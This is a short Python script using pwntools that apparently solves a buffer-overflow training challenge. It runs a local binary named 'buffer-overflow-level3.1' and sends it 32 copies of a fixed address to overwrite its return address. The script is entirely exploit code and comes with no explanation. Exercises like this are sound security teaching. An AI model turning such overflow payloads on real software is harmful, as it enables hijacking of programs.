from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

name = 'aaa'
payload =   32 * p64(0x00401300)


print(payload)

io = process('/challenge/buffer-overflow-level3.1')

io.sendafter("Give me your name:\n", name)
io.sendlineafter("Say something to me:\n", payload)

while True:
    io.recvline()
